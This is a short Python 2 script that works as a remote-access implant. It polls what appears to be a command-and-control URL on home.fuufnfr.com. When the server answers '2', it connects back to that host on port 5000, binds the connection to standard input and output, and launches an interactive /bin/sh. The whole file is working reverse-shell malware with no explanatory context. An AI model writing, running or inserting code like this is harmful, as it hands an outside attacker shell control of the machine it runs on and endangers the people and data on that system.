import socket 
import subprocess 
import os
import sys
from urllib2 import urlopen

def log(text):
	print text

def rev_shell():
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("home.fuufnfr.com",5000))

	os.dup2(s.fileno(),0) 
	os.dup2(s.fileno(),1) 
	os.dup2(s.fileno(),2)

	p=subprocess.call(["/bin/sh","-i"])

def main():
	command = urlopen('http://home.fuufnfr.com:5001/cnc?uid=1000')
	com = command.read()	

	if com == "2":rev_shell(); 

if __name__ == "__main__":
	main()
